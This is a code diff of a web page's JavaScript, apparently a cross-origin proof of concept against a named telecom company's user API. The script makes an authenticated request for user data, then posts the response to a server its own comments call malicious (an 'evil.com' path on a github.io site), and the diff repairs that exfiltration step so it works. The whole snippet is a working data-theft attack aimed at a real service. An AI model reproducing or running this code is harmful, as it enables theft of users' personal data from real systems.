@@ -38,7 +38,7 @@
    function cors(){
     var xhttp = new XMLHttpRequest();
 
-    // Make an authenticated request
+    // Make an authenticated request to the Vodafone API
     xhttp.open("GET", "https://vodafone.om/api/backend/ajax/v1/users", true);
     xhttp.setRequestHeader("Authorization", "Bearer your-jwt-token"); // Add JWT token here
     xhttp.setRequestHeader("Content-type", "application/json"); 
@@ -50,13 +50,15 @@
             document.getElementById("demo").innerHTML = response;
             console.log(response);
 
-            // Sending data to the malicious server
-            xhttp.open("POST", "https://salamoxso.github.io/evil.com/", true);
-            xhttp.setRequestHeader("Content-type", "application/json");
-            xhttp.send("data=" + response);
+            // Sending data to the malicious server (Ensure this URL is correct)
+            var maliciousRequest = new XMLHttpRequest();
+            maliciousRequest.open("POST", "https://salamoxso.github.io/evil.com/", true); // Correct the URL here
+            maliciousRequest.setRequestHeader("Content-type", "application/json");
+            maliciousRequest.send(JSON.stringify({ data: response }));
         }
     };
 }
+
 
     </script>
 </body>
